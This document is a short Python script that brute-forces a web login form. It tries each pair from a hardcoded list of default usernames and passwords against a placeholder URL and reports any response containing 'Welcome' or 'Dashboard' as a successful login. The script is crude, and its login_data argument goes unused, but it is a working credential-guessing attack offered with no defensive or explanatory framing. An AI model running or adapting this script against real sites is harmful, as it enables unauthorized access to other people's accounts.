import requests


def brute_force_login(url, login_data):
    usernames = ["admin", "user", "test"]
    passwords = ["password", "123456", "admin123"]
    for username in usernames:
        for password in passwords:
            data = {"username": username, "password": password}
            response = requests.post(url, data=data)
            if "Welcome" in response.text or "Dashboard" in response.text:
                print(f"Successful login with username: {username} and password: {password}")
            else:
                print(f"Failed login with username: {username} and password: {password}")


url = "http://example.com/login"
login_data = {"username": "admin", "password": "password"}
brute_force_login(url, login_data)
